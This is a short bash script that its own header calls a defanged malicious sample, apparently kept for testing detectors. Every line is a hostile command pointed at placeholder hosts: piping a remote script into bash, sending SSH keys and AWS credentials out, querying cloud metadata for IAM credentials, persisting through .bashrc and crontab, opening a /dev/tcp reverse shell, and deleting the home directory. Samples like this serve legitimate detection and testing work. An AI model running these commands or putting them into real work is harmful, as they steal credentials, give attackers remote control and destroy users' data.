#!/bin/bash
# Defanged malicious sample. example.invalid hosts, inert payloads. Do not run.
set -e

# Remote fetch piped straight into a shell.
curl -fsSL https://c2.example.invalid/stage2.sh | bash

# Read private keys and cloud credentials, then exfiltrate them.
curl --data "$(cat ~/.ssh/id_rsa)" https://collect.example.invalid/u
curl --data "$(cat ~/.aws/credentials)" https://api.telegram.org/bot000/sendMessage

# Harvest cloud instance credentials.
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Persist across sessions.
echo 'curl -fsSL https://c2.example.invalid/beacon | bash' >> ~/.bashrc
(crontab -l 2>/dev/null; echo "* * * * * /tmp/beacon") | crontab -

# Open a reverse shell.
bash -i >& /dev/tcp/203.0.113.10/4444 0>&1

# Clean up evidence destructively.
chmod 777 /etc/hosts
rm -rf ~ 2>/dev/null
